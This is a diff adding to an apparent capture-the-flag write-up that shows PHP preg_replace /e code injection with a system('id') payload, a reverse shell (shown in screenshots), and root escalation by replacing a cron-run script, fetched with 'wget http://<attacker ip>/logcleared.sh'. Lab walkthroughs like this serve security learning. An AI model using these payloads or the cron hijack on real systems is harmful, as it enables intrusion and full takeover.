@@ -114,21 +114,70 @@ Let's take a look at article's exploitation example:
 
 ![obraz](https://github.com/user-attachments/assets/fea10a24-8930-46d4-9b3a-74270e56035e)
 
+When done it looks something like that:  
++  preg_replace(/a/e, system("id"), a)
+
+Let's try it:  
+
+![obraz](https://github.com/user-attachments/assets/7dc61ae1-fb65-4498-bdfc-e9d3cd7b05f5)
+
+
+It works!, now we need to put reverse shell there:  
+
+![obraz](https://github.com/user-attachments/assets/96e40a3c-338e-4cb9-a16a-0048abfca1f0)
+
+And we get a connection back:   
+
+![obraz](https://github.com/user-attachments/assets/15a0156f-4847-45aa-80d7-7145a0450884)
 
 
 
 
+## Priv Esc to root
 
+First thing I checked was db.php:  
 
+![obraz](https://github.com/user-attachments/assets/5f172ec8-cf6b-4d75-91bd-3b9470c683a7)
 
+Mysql didn't reveal anything new.  
+The vulnerable query  that allowed authentication bypass was:  
 
+![obraz](https://github.com/user-attachments/assets/1ed45424-dc85-4cb3-91fd-bd897261b8da)
 
+There is also a script called clearlogs:  
 
+![obraz](https://github.com/user-attachments/assets/dbead88c-4419-41f7-9907-a07f1de09d86)
 
+This script is likely executed by a cron job to regularly clear the logs.  
+With pspy64 we can verify if it's running as a cronjob:  
 
+![obraz](https://github.com/user-attachments/assets/a04d75d5-1fee-499d-8748-b75a96f839a4)
 
+It does run as cron job:  
++  /usr/bin/php /var/www/cronjobs/clearlogs
++  /bin/sh -c /var/www/cronjobs/clearlogs
 
+There is a line in this file that is very intresting:  
++  exec('/var/www/cmd/logcleared.sh');
 
+It turns out that we own /var/www/cmd directory.  
+All we need to do now is to change logcleared.sh  
+
+![obraz](https://github.com/user-attachments/assets/45c1d263-5ddc-45c2-9843-6172a9f0ce9a)
+```
+wget http://<attacker ip>/logcleared.sh
+```
+
+![obraz](https://github.com/user-attachments/assets/e7b9522c-67f1-48fa-9c54-749f7751902d)
+
+Now start a listener and wait for it to execute.  
+After that we can retrieve both flags:  
+
+![obraz](https://github.com/user-attachments/assets/84cccdca-44a6-492f-b6b6-f377bc73b416)
+
+![obraz](https://github.com/user-attachments/assets/38a3d2c8-3e4e-4922-bd45-8129407b1e1a)
+
+Thank you for reading!!  
 
 
 
